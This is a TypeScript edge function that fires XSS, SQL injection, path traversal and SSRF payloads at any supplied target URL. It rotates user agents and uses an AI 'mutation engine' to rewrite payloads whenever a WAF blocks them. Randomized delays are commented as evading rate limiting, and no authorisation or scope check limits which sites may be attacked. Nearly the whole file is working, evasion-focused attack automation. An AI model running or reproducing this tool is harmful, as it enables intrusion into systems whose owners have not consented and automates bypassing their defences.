import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

// ─── Strict Interfaces ───
interface PayloadObject {
  raw: string;
  encoded: string;
  attackType: string;
  parameter: string;
  injectionPoint: "query" | "body" | "header" | "path" | "cookie";
}

interface ExecutionRequest {
  target: string;
  payloads: PayloadObject[];
  maxRetries?: number;
  techStack?: string[];
  authToken?: string;
}

interface AttemptResult {
  payload: PayloadObject;
  attemptNumber: number;
  httpStatus: number | null;
  success: boolean;
  blocked: boolean;
  errorReason: string | null;
  mutatedPayload: string | null;
  mutationStrategy: string | null;
  responseSnippet: string | null;
  timestamp: string;
}

interface ExecutionReport {
  target: string;
  totalPayloads: number;
  successCount: number;
  blockedCount: number;
  defendedCount: number;
  errorCount: number;
  results: AttemptResult[];
  chainId: string;
}

// ─── Helpers ───
function randomDelay(min: number, max: number): Promise<void> {
  const ms = Math.floor(Math.random() * (max - min + 1)) + min;
  return new Promise((resolve) => setTimeout(resolve, ms));
}

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
];

function isBlocked(status: number): boolean {
  return [403, 406, 429, 503].includes(status);
}

function isSuccess(status: number, body: string, payload: PayloadObject): boolean {
  if (status >= 500) return false;
  // Check for reflection (XSS indicators)
  if (payload.attackType === "xss" && body.includes(payload.raw)) return true;
  // Check for SQL error signatures
  if (payload.attackType === "sqli") {
    const sqlErrors = ["sql syntax", "mysql", "postgresql", "sqlite", "oracle", "you have an error", "unclosed quotation"];
    if (sqlErrors.some((e) => body.toLowerCase().includes(e))) return true;
  }
  // Check for path traversal
  if (payload.attackType === "traversal" && (body.includes("root:") || body.includes("[extensions]"))) return true;
  // Check for SSRF
  if (payload.attackType === "ssrf" && body.includes("127.0.0.1")) return true;
  // Generic: 200 with the payload reflected
  if (status === 200 && body.includes(payload.raw)) return true;
  return false;
}

// ─── Core: Fire Single Payload with Retry Loop ───
async function executeWithRetry(
  target: string,
  payload: PayloadObject,
  maxRetries: number,
  techStack: string[],
  supabaseUrl: string,
  chainId: string,
  userId: string,
  supabase: any
): Promise<AttemptResult[]> {
  const results: AttemptResult[] = [];
  let currentPayload = payload.raw;
  let attemptNumber = 1;

  while (attemptNumber <= maxRetries + 1) {
    const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
    let httpStatus: number | null = null;
    let responseBody = "";
    let errorReason: string | null = null;
    let blocked = false;
    let success = false;

    // ─── Record attempt start ───
    const mutationRecord: any = {
      user_id: userId,
      target,
      parameter: payload.parameter,
      original_payload: payload.raw,
      mutated_payload: attemptNumber > 1 ? currentPayload : null,
      attempt_number: attemptNumber,
      max_retries: maxRetries,
      status: "firing",
      chain_id: chainId,
    };

    const { data: insertedAttempt } = await supabase
      .from("mutation_attempts")
      .insert(mutationRecord)
      .select("id")
      .single();

    const attemptId = insertedAttempt?.id;

    // ─── Fire the payload ───
    try {
      let url = target;
      const headers: Record<string, string> = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      };

      if (payload.injectionPoint === "query") {
        const separator = url.includes("?") ? "&" : "?";
        url = `${url}${separator}${payload.parameter}=${encodeURIComponent(currentPayload)}`;
      }

      const fetchOptions: RequestInit = {
        method: payload.injectionPoint === "body" ? "POST" : "GET",
        headers,
        redirect: "follow",
      };

      if (payload.injectionPoint === "body") {
        fetchOptions.body = `${payload.parameter}=${encodeURIComponent(currentPayload)}`;
        headers["Content-Type"] = "application/x-www-form-urlencoded";
      }

      if (payload.injectionPoint === "header") {
        headers[payload.parameter] = currentPayload;
      }

      if (payload.injectionPoint === "cookie") {
        headers["Cookie"] = `${payload.parameter}=${currentPayload}`;
      }

      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000);

      const response = await fetch(url, { ...fetchOptions, signal: controller.signal });
      clearTimeout(timeout);

      httpStatus = response.status;
      responseBody = await response.text().catch(() => "");
      responseBody = responseBody.substring(0, 2000); // Truncate

      blocked = isBlocked(httpStatus);
      success = isSuccess(httpStatus, responseBody, { ...payload, raw: currentPayload });

      if (blocked) {
        errorReason = `HTTP ${httpStatus} - WAF/Security filter blocked`;
      }
    } catch (err) {
      errorReason = err.name === "AbortError" ? "Connection timeout (10s)" : `Network error: ${err.message}`;
      blocked = true;
    }

    // ─── Log the result ───
    const result: AttemptResult = {
      payload,
      attemptNumber,
      httpStatus,
      success,
      blocked,
      errorReason,
      mutatedPayload: attemptNumber > 1 ? currentPayload : null,
      mutationStrategy: null,
      responseSnippet: responseBody?.substring(0, 500) || null,
      timestamp: new Date().toISOString(),
    };

    // Update DB record
    if (attemptId) {
      await supabase
        .from("mutation_attempts")
        .update({
          http_status: httpStatus,
          error_reason: errorReason,
          status: success ? "success" : blocked ? "blocked" : "error",
          response_body: responseBody?.substring(0, 1000),
        })
        .eq("id", attemptId);
    }

    results.push(result);

    // ─── Decision: Exit or Mutate ───
    if (success) {
      console.log(`[Loop] ✅ SUCCESS on attempt #${attemptNumber} for ${payload.parameter}`);
      // Record successful attack attempt
      await supabase.from("attack_attempts").insert({
        user_id: userId,
        target,
        attack_type: payload.attackType,
        technique: `mutation-retry-${attemptNumber}`,
        payload: currentPayload,
        output: responseBody?.substring(0, 500),
        success: true,
      });
      break;
    }

    if (blocked && attemptNumber <= maxRetries) {
      console.log(`[Loop] 🔄 Blocked on attempt #${attemptNumber}, requesting AI mutation...`);

      // Update status to mutating
      if (attemptId) {
        await supabase.from("mutation_attempts").update({ status: "mutating" }).eq("id", attemptId);
      }

      // ─── Call Mutation Engine ───
      try {
        const mutationResponse = await fetch(`${supabaseUrl}/functions/v1/mutation-engine`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            originalPayload: currentPayload,
            targetContext: `${target} [param: ${payload.parameter}]`,
            errorReason: errorReason || `HTTP ${httpStatus}`,
            attemptNumber,
            attackType: payload.attackType,
            techStack,
          }),
        });

        if (mutationResponse.ok) {
          const mutation = await mutationResponse.json();
          
          // Hallucination guard
          if (mutation.mutatedPayload && mutation.mutatedPayload.length >= 3 && mutation.mutatedPayload !== currentPayload) {
            currentPayload = mutation.mutatedPayload;
            result.mutationStrategy = mutation.strategy;

            if (attemptId) {
              await supabase.from("mutation_attempts").update({
                mutation_strategy: mutation.strategy,
                ai_response: mutation.mutatedPayload,
                ai_prompt: `Mutate: ${payload.raw} | Error: ${errorReason}`,
              }).eq("id", attemptId);
            }

            console.log(`[Loop] 🧬 Mutated payload (${mutation.strategy}): ${currentPayload.substring(0, 80)}...`);
          } else {
            console.warn("[Loop] ⚠️ AI returned invalid mutation, counting as failed retry");
            if (attemptId) {
              await supabase.from("mutation_attempts").update({ status: "error", error_reason: "AI hallucination - invalid mutation" }).eq("id", attemptId);
            }
          }
        }
      } catch (mutErr) {
        console.error("[Loop] Mutation engine call failed:", mutErr);
      }

      // Randomized delay to evade rate-limiting (2-5 seconds)
      const delayMs = 2000 + Math.floor(Math.random() * 3000);
      console.log(`[Loop] ⏳ Waiting ${delayMs}ms before retry...`);
      await randomDelay(delayMs, delayMs);

      attemptNumber++;
    } else {
      // Max retries reached or non-blocked error
      if (attemptNumber > maxRetries) {
        console.log(`[Loop] 🛡️ DEFENDED: ${payload.parameter} after ${maxRetries} retries`);
        if (attemptId) {
          await supabase.from("mutation_attempts").update({ status: "defended" }).eq("id", attemptId);
        }
        await supabase.from("attack_attempts").insert({
          user_id: userId,
          target,
          attack_type: payload.attackType,
          technique: `defended-after-${maxRetries}-retries`,
          payload: currentPayload,
          output: "Target successfully defended against mutation attempts",
          success: false,
          error_message: "Max retries reached - target is protected",
        });
      }
      break;
    }
  }

  return results;
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get("SUPABASE_URL") || "";
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") || "";
    const supabase = createClient(supabaseUrl, supabaseKey);

    const body: ExecutionRequest = await req.json();
    const { target, payloads, maxRetries = 3, techStack = [], authToken } = body;

    if (!target || !payloads?.length) {
      return new Response(
        JSON.stringify({ error: "Missing target or payloads" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Get user from auth token
    let userId = "anonymous";
    const authHeader = req.headers.get("Authorization");
    if (authHeader) {
      const token = authHeader.replace("Bearer ", "");
      const { data: { user } } = await supabase.auth.getUser(token);
      if (user) userId = user.id;
    }

    const chainId = crypto.randomUUID();
    console.log(`[ExecutionLoop] Starting chain ${chainId} | Target: ${target} | Payloads: ${payloads.length}`);

    // ─── Execute all payloads concurrently (non-blocking) ───
    const allResults: AttemptResult[] = [];
    
    // Process payloads in batches of 3 to avoid overwhelming target
    const batchSize = 3;
    for (let i = 0; i < payloads.length; i += batchSize) {
      const batch = payloads.slice(i, i + batchSize);
      const batchPromises = batch.map((p) =>
        executeWithRetry(target, p, maxRetries, techStack, supabaseUrl, chainId, userId, supabase)
      );
      const batchResults = await Promise.all(batchPromises);
      allResults.push(...batchResults.flat());

      // Small delay between batches
      if (i + batchSize < payloads.length) {
        await randomDelay(500, 1500);
      }
    }

    // ─── Compile report ───
    const report: ExecutionReport = {
      target,
      totalPayloads: payloads.length,
      successCount: allResults.filter((r) => r.success).length,
      blockedCount: allResults.filter((r) => r.blocked && !r.success).length,
      defendedCount: allResults.filter((r) => r.errorReason?.includes("Max retries")).length,
      errorCount: allResults.filter((r) => !r.success && !r.blocked).length,
      results: allResults,
      chainId,
    };

    console.log(`[ExecutionLoop] Chain ${chainId} complete | ✅ ${report.successCount} | 🛡️ ${report.blockedCount} blocked | ${report.defendedCount} defended`);

    return new Response(JSON.stringify(report), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("[ExecutionLoop] Fatal error:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
